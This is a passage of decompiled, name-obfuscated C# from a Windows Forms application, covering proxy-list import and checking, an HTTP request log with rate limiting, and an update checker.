				using (SocksCheck socksCheck = new SocksCheck())
				{
					socksCheck.arrayList_0.AddRange(Globals.G_SOCKS.method_8());
					socksCheck.Text = Globals.translate_0.GetStr(this, 65);
					if (socksCheck.arrayList_0.Count == 0)
					{
						method_1(Globals.translate_0.GetStr(this, 66));
						Interaction.Beep();
						break;
					}
					socksCheck.ShowDialog(this);
					Globals.LockWindowUpdate(dtgSocks.Handle);
					if (socksCheck.DialogResult == DialogResult.OK)
					{
						Globals.G_SOCKS.method_4((string[])socksCheck.arrayList_2.ToArray(typeof(string)));
					}
					Globals.LockWindowUpdate(IntPtr.Zero);
					socksCheck.Dispose();
				}
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 241;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_199(object sender, EventArgs e)
	{
		Globals.G_SOCKS.method_7();
	}

	private void method_200(object sender, EventArgs e)
	{
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		try
		{
			string text = default(string);
			Match match;
			if (sender == btnSocksAppend)
			{
				if (Clipboard.ContainsText())
				{
					text = Clipboard.GetText();
				}
			}
			else
			{
				string text2 = default(string);
				using (ImpBox impBox = new ImpBox())
				{
					impBox.MinLengh = 5;
					impBox.txtValue.MaxLength = 1024;
					impBox.Text = btnSocksUrl.Text;
					impBox.txtValue.Text = Class50.smethod_5(base.Name, "ProxyURL", "");
					if (impBox.ShowDialog(this) == DialogResult.OK)
					{
						text2 = impBox.txtValue.Text.Trim();
					}
				}
				Http val = new Http();
				val.UserAgent = Conversions.ToString(Globals.GetObjectValue(Globals.GMain.txtUserAgent));
				val.Accept = Conversions.ToString(Globals.GetObjectValue(Globals.GMain.txtAccept));
				val.ConnectTimeout = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numHTTPTimeout));
				val.ReadTimeout = val.ConnectTimeout;
				val.FollowRedirects = true;
				val.AutoAddHostHeader = true;
				val.AllowGzip = true;
				val.SendCookies = true;
				val.SaveCookies = true;
				val.CookieDir = "memory";
				val.UseIEProxy = false;
				text = val.QuickGetStr(text2);
				if (!string.IsNullOrEmpty(text))
				{
					text = Class23.smethod_5(text);
					text = text.Replace(" ", "");
					match = Regex.Match(text, "([1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}:(\\d+))", RegexOptions.IgnoreCase);
					if (!match.Success)
					{
						match = Regex.Match(text, ">(\\d+)<", RegexOptions.IgnoreCase);
						if (match.Success)
						{
							match = Regex.Match(text, "([1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2})|>(\\d+)<", RegexOptions.IgnoreCase);
							if (match.Success)
							{
								text = "";
								while (match.Success)
								{
									try
									{
										text = text + match.Value + "\t";
									}
									catch (Exception projectError)
									{
										ProjectData.SetProjectError(projectError);
										ProjectData.ClearProjectError();
									}
									match = match.NextMatch();
								}
								text = text.Replace("<", "");
								text = text.Replace(">", "");
							}
						}
					}
				}
				val.Dispose();
				Class50.smethod_4(base.Name, "ProxyURL", text2);
			}
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			text = text.Replace("\t\t", "\t");
			text = text.Replace("\t", ":");
			text = text.Replace("*", "");
			text = text.Replace(" ", "");
			match = Regex.Match(text, "([1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}\\.[1-2]?\\d{1,2}:(\\d+))", RegexOptions.IgnoreCase);
			int num = default(int);
			if (match.Success)
			{
				using ProxyType proxyType = new ProxyType();
				proxyType.ShowDialog(this);
				if (proxyType.DialogResult != DialogResult.OK)
				{
					return;
				}
				switch (proxyType.cmbProxy.SelectedIndex)
				{
				case 0:
					num = 0;
					break;
				case 1:
					num = 4;
					break;
				case 2:
					num = 5;
					break;
				}
			}
			Globals.LockWindowUpdate(dtgSocks.Handle);
			while (match.Success)
			{
				try
				{
					Globals.G_SOCKS.method_3(match.Value + ":" + Conversions.ToString(num));
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				match = match.NextMatch();
			}
			Globals.LockWindowUpdate(IntPtr.Zero);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private string method_201(string string_5)
	{
		Regex regex = new Regex(">(\\\\S+)<", RegexOptions.IgnoreCase | RegexOptions.Compiled);
		Match match = regex.Match(string_5);
		StringBuilder stringBuilder = new StringBuilder();
		if (!match.Success)
		{
			stringBuilder.Append(string_5);
		}
		else
		{
			while (match.Success)
			{
				stringBuilder.Append(match.Value + "\t");
				match = match.NextMatch();
			}
		}
		return stringBuilder.ToString();
	}

	private void method_202(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText(lvwHttpLog.SelectedRows[0].Cells[1].Value.ToString());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_203(object sender, EventArgs e)
	{
		Globals.ShellUrl(lvwHttpLog.SelectedRows[0].Cells[1].Value.ToString());
	}

	private void method_204(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 58:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
				lvwHttpLog.Rows.Clear();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 58;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_205(object sender, EventArgs e)
	{
		bool_4 = mnuHttpLogAutoScroll.Checked;
		mnuHttpLog.ShowCheckMargin = bool_4;
	}

	private void toolStripButton_3_CheckedChanged(object sender, EventArgs e)
	{
		Globals.LockWindowUpdate(base.Handle);
		if (!((ToolStripButton)sender).Checked)
		{
			method_204(null, null);
		}
		grbHttpLog.Visible = ((ToolStripButton)sender).Checked;
		Globals.LockWindowUpdate(IntPtr.Zero);
	}

	internal void method_206(long long_0, string string_5, string string_6, string string_7, string string_8, string string_9)
	{
		if (lvwHttpLog.InvokeRequired)
		{
			lvwHttpLog.Invoke(new Delegate52(method_206), long_0, string_5, string_6, string_7, string_8, string_9);
			return;
		}
		try
		{
			if (long_0 < 0)
			{
				return;
			}
			IEnumerator enumerator = ((IEnumerable)lvwHttpLog.Rows).GetEnumerator();
			try
			{
				DataGridViewRow dataGridViewRow;
				do
				{
					if (enumerator.MoveNext())
					{
						dataGridViewRow = (DataGridViewRow)enumerator.Current;
						continue;
					}
					return;
				}
				while (!dataGridViewRow.Cells[0].Value.Equals(long_0));
				dataGridViewRow.Cells[2].Value = string_6;
				dataGridViewRow.Cells[3].Value = string_7;
				dataGridViewRow.Cells[4].Value = string_8;
				dataGridViewRow.Tag = string_9;
			}
			finally
			{
				IDisposable disposable = enumerator as IDisposable;
				if (disposable != null)
				{
					disposable.Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox(ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	internal long method_207(string string_5, string string_6)
	{
		if (base.InvokeRequired)
		{
			return Conversions.ToLong(Invoke(new Delegate51(method_207), string_5, string_6));
		}
		long ticks = DateAndTime.Now.Ticks;
		checked
		{
			if (toolStripButton_3.Checked)
			{
				if (_0024STATIC_0024AddLog_0024202AEE_0024iCount_0024Init == null)
				{
					Interlocked.CompareExchange(ref _0024STATIC_0024AddLog_0024202AEE_0024iCount_0024Init, new StaticLocalInitFlag(), null);
				}
				bool lockTaken = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024AddLog_0024202AEE_0024iCount_0024Init, ref lockTaken);
					if (_0024STATIC_0024AddLog_0024202AEE_0024iCount_0024Init.State == 0)
					{
						_0024STATIC_0024AddLog_0024202AEE_0024iCount_0024Init.State = 2;
						_0024STATIC_0024AddLog_0024202AEE_0024iCount = 0;
					}
					else if (_0024STATIC_0024AddLog_0024202AEE_0024iCount_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					_0024STATIC_0024AddLog_0024202AEE_0024iCount_0024Init.State = 1;
					if (lockTaken)
					{
						Monitor.Exit(_0024STATIC_0024AddLog_0024202AEE_0024iCount_0024Init);
					}
				}
				if (_0024STATIC_0024AddLog_0024202AEE_0024iSkiped_0024Init == null)
				{
					Interlocked.CompareExchange(ref _0024STATIC_0024AddLog_0024202AEE_0024iSkiped_0024Init, new StaticLocalInitFlag(), null);
				}
				bool lockTaken2 = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024AddLog_0024202AEE_0024iSkiped_0024Init, ref lockTaken2);
					if (_0024STATIC_0024AddLog_0024202AEE_0024iSkiped_0024Init.State == 0)
					{
						_0024STATIC_0024AddLog_0024202AEE_0024iSkiped_0024Init.State = 2;
						_0024STATIC_0024AddLog_0024202AEE_0024iSkiped = 0;
					}
					else if (_0024STATIC_0024AddLog_0024202AEE_0024iSkiped_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					_0024STATIC_0024AddLog_0024202AEE_0024iSkiped_0024Init.State = 1;
					if (lockTaken2)
					{
						Monitor.Exit(_0024STATIC_0024AddLog_0024202AEE_0024iSkiped_0024Init);
					}
				}
				lock (stopwatch_0)
				{
					if (stopwatch_0.ElapsedMilliseconds < 1000)
					{
						_0024STATIC_0024AddLog_0024202AEE_0024iCount++;
						if (_0024STATIC_0024AddLog_0024202AEE_0024iCount > 15)
						{
							_0024STATIC_0024AddLog_0024202AEE_0024iSkiped++;
							return -1L;
						}
					}
					else
					{
						_0024STATIC_0024AddLog_0024202AEE_0024iCount = 0;
						stopwatch_0 = Stopwatch.StartNew();
					}
					if (_0024STATIC_0024AddLog_0024202AEE_0024iSkiped > 1)
					{
						lvwHttpLog.Rows.Add(0, "         " + Conversions.ToString(_0024STATIC_0024AddLog_0024202AEE_0024iSkiped) + " " + Globals.translate_0.GetStr(this, 67) + " " + Conversions.ToString(100) + Globals.translate_0.GetStr(this, 68), "", "", "", "");
						_0024STATIC_0024AddLog_0024202AEE_0024iSkiped = 0;
					}
					lvwHttpLog.Rows.Add(ticks, string_5, "", "", "Connecting..", string_6);
					if (bool_4)
					{
						lvwHttpLog.FirstDisplayedScrollingRowIndex = lvwHttpLog.Rows.Count - 1;
					}
					return ticks;
				}
			}
			long result = default(long);
			return result;
		}
	}

	private void method_208(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				Globals.LockWindowUpdate(base.Handle);
				toolStripButton_3.Visible = false;
				grbHttpLog.Visible = false;
				HttpLog httpLog = new HttpLog(toolStripButton_3, grbHttpLog, lvwHttpLog);
				httpLog.Controls.Add(lvwHttpLog);
				httpLog.Top = (int)Math.Round((double)Globals.GMain.Top + (double)Globals.GMain.Height / 2.0 - (double)httpLog.Height / 2.0);
				httpLog.Left = (int)Math.Round((double)Globals.GMain.Left + (double)Globals.GMain.Width / 2.0 - (double)httpLog.Width / 2.0);
				httpLog.Show(this);
				Globals.LockWindowUpdate(IntPtr.Zero);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox(ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_209(object sender, CancelEventArgs e)
	{
		mnuHttpLogDock.Visible = toolStripButton_3.Visible;
		if (lvwHttpLog.SelectedRows.Count == 1)
		{
			mnuHttpLogClipboard.Visible = lvwHttpLog.SelectedRows[0].Cells[1].Value.ToString().ToLower().Contains("http");
			mnuHttpLogShell.Visible = mnuHttpLogClipboard.Visible;
		}
		else
		{
			mnuHttpLogClipboard.Visible = false;
			mnuHttpLogShell.Visible = false;
		}
	}

	private void method_210(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			mnuDownloads.Show(Control.MousePosition);
		}
	}

	private void method_211(object sender, EventArgs e)
	{
	}

	private void method_212()
	{
		Globals.GUpdater = new Updater();
		bool flag = default(bool);
		if (chkUpdater.Checked)
		{
			switch (cmbUpdater.SelectedIndex)
			{
			case 0:
				flag = true;
				break;
			case 1:
			case 2:
			{
				if (DateTime.TryParse(Class50.smethod_5("Update", "LastCheck", ""), out var result))
				{
					int num = ((cmbUpdater.SelectedIndex != 1) ? 30 : 7);
					if (DateTime.Now.Subtract(result).TotalDays >= (double)num)
					{
						flag = true;
					}
				}
				else
				{
					flag = true;
				}
				break;
			}
			}
		}
		if (flag)
		{
			Class50.smethod_4("Update", "LastCheck", DateTime.Now.ToString());
			Globals.GUpdater.Check(bMsgBox: false);
		}
	}

	private void method_213(object sender, EventArgs e)
	{
		Cursor = Cursors.WaitCursor;
		Application.DoEvents();
		Class50.smethod_4("Update", "LastCheck", DateTime.Now.ToString());
		Globals.GUpdater.Check(bMsgBox: true);
		Cursor = Cursors.Default;
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private bool method_214()
	{
		return method_22();
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_215(object object_0)
	{
		method_30((Globals.SearchHost)Conversions.ToByte(object_0));
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_216(object object_0)
	{
		method_36((Class25)object_0);
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_217(object object_0)
	{
		method_36((Class25)object_0);
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_218(object object_0)
	{
		method_48((Class49)object_0);
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_219(object object_0)
	{
		method_46((Class49)object_0);
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_220(object sender, EventArgs e)
	{
		method_72();
	}

	[SpecialName]
	[DebuggerHidden]
	[CompilerGenerated]
	private void method_221(object sender, EventArgs e)
	{
		method_72();
	}
}
